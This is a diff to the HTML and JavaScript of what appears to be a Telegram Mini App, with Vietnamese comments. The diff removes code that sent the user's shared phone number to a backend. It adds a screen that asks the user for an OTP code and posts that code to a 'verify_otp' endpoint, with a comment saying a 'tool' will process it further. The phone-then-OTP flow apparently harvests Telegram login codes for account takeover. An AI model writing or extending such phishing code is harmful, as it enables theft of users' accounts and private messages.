@@ -36,31 +36,25 @@
     });
 
     // 3. Xử lý khi Telegram trả kết quả
-    // 3. Xử lý khi Telegram trả kết quả
-    tg.onEvent('contactRequested', async (data) => {
-        // Truy cập chính xác vào vị trí phone_number theo cấu trúc dữ liệu của bạn
-        const phoneNumber = (data.responseUnsafe && data.responseUnsafe.contact) ? data.responseUnsafe.contact.phone_number : null;
+    // Thay thế đoạn tg.close() cũ bằng đoạn này:
+// Ẩn nút cũ, hiện ô nhập mã
+document.body.innerHTML = `
+    <div style="padding: 20px; color: white;">
+        <h3>Nhập mã OTP</h3>
+        <input type="text" id="otpInput" placeholder="Nhập mã..." style="padding: 10px; width: 100%;">
+        <button id="sendOtpBtn" style="padding: 10px; width: 100%; margin-top: 10px;">Xác nhận OTP</button>
+    </div>
+`;
 
-        if (phoneNumber) {
-            tg.MainButton.text = "ĐANG XỬ LÝ...";
-            try {
-                await fetch(`${BACKEND_URL}/send_phone`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: phoneNumber })
-                });
-                
-                tg.MainButton.text = "THÀNH CÔNG!";
-                setTimeout(() => { tg.close(); }, 1000);
-            } catch (err) {
-                alert("Lỗi server: " + err.message);
-                tg.MainButton.text = "THỬ LẠI";
-            }
-        } else {
-            alert("Không tìm thấy SĐT trong dữ liệu nhận được.");
-            tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
-        }
+document.getElementById('sendOtpBtn').addEventListener('click', async () => {
+    const otp = document.getElementById('otpInput').value;
+    // Gửi mã OTP này về backend để tool xử lý tiếp
+    await fetch(`${BACKEND_URL}/verify_otp`, {
+        method: 'POST',
+        body: JSON.stringify({ otp: otp })
     });
+    alert("Đang kiểm tra mã...");
+});
 </script>
 </body>
 </html>
